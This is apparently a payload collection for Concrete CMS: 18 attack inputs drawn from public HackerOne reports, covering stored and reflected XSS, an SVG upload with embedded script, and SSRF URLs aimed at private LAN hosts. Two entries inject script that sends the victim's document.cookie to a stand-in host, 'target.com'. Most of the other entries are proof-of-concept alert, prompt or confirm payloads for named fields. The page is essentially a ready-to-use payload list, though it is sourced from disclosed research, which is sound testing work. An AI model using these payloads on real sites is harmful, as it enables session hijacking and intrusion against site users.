# Concrete CMS

18 payloads.

### `92ae0210`

```
"><svg/onload=confirm(document.domain)>
```

**Parameter:** `name`
— [Stored XSS in Express Objects - Concrete5 v8.1.0](https://hackerone.com/reports/221325) · Concrete CMS · [cdl](https://hackerone.com/cdl)

### `e3da1632`

```
<svg/onload=confirm(document.domain)>
```

**Parameter:** `name`
— [Stored XSS in Express Objects - Concrete5 v8.1.0](https://hackerone.com/reports/221325) · Concrete CMS · [cdl](https://hackerone.com/cdl)

### `5ef1a686`

```
" onmouseover="alert('Stored XSS in SEO Name field')"
```

**Parameter:** `Name`
— [Stored XSS in Pages SEO dialog Name field (concrete5 8.1.0)](https://hackerone.com/reports/230029) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `d015e427`

```
" onfocus="alert('Stored XSS in SEO Name field')"  autofocus="true"
```

**Parameter:** `seo_name`
— [Stored XSS in Pages SEO dialog Name field (concrete5 8.1.0)](https://hackerone.com/reports/230029) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `e351e2bd`

```
<p>These are not the payloads you're looking for... </p><script>console.error('Stored XSS, browser:', navigator.appVersion)</script>
```

**Parameter:** `headline`
— [Stored XSS in Headline TextControl element in Express forms \[ concrete5 8.1.0 \]](https://hackerone.com/reports/230278) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `6e16fa9d`

```
</textarea>
<script>
    var i = document.createElement('img')
    i.src = 'https://target.com/?c=' + document.cookie;
    document.body.append(i);
</script>
```

— [Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload](https://hackerone.com/reports/247517) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `122d1fa3`

```
<div class="form-group">
				<label for="body" class="control-label">Message</label>				<textarea id="msgBody" name="msgBody" rows="8" class="span5 form-control">


-------------------- Original Message --------------------
From: kotek
Date Sent: Jul 9, 2017, 9:55 PM
Subject: Problem with page!!!

Hi, could you please take a look at this and reply? Thanks!

</textarea>
<script>
        var i = document.createElement('img')
        i.src = 'https://target.com/?c=' + document.cookie;

```

— [Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload](https://hackerone.com/reports/247517) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `1efb72f0`

```
locals" onclick=alert('XSS!') "'>
```

**Parameter:** `Name`
— [Stored XSS in Name field in User Groups/Group Details form](https://hackerone.com/reports/247521) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `3a4cda89`

```
',row:1}));alert("xss in path");debugger;(({y:'1
```

**Parameter:** `location`
— [Stored XSS vulnerability in additional URLs in 'Location' dialog \[Sitemap\]](https://hackerone.com/reports/251358) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `7c8c6a70`

```
'<script>alert(1)</script>'
```

**Parameter:** `db_name`
— [Reflected XSS vulnerability in Database name field on installation screen](https://hackerone.com/reports/289330) · Concrete CMS · [sts](https://hackerone.com/sts)

### `f5008bee`

```
">TEST<img src=K onerror=prompt(document.domain)>
```

— [Stored XSS on Add Event in Calendar](https://hackerone.com/reports/300532) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `a18513f8`

```
8. In the **Name** field type something like this: ">TEST<img src=K onerror={here goes mad js code}>
```

— [Stored XSS on Add Event in Calendar](https://hackerone.com/reports/300532) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `69eab6d1`

```
Hi, Admin<img src=K onerror=prompt(document.location) width=1px height=1px>
```

— [Stored XSS on Add Calendar](https://hackerone.com/reports/300571) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `2f634a85`

```
7. In **Calendar Name** type something like: **TEST<img src=K onerror={here goes js payload}>**
```

— [Stored XSS on Add Calendar](https://hackerone.com/reports/300571) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `6606b6b9`

```
<svg xmlns="http://target.com/2000/svg" viewBox="0 0 96 105">
<html><head><title>test</title></head><body><script>alert('xss');</script></body></html>
</svg>
```

— [SVG file that HTML Included is able to upload via File Manager](https://hackerone.com/reports/437863) · Concrete CMS · [hexife](https://hackerone.com/hexife)

### `736f59da`

```
<script>alert('XSS')</script>
```

— [XSS in select attribute options](https://hackerone.com/reports/753567) · Concrete CMS · [sunny0day](https://hackerone.com/sunny0day)

### `51e612cf`

```
http://192.168.1.148/index.php/test.png
```

— [SSRF - pivoting in the private LAN](https://hackerone.com/reports/1364797) · Concrete CMS · [adrian_t](https://hackerone.com/adrian_t)

### `f570e156`

```
http://192.168.1.157/info.php/test.html
```

— [SSRF - pivoting in the private LAN](https://hackerone.com/reports/1364797) · Concrete CMS · [adrian_t](https://hackerone.com/adrian_t)
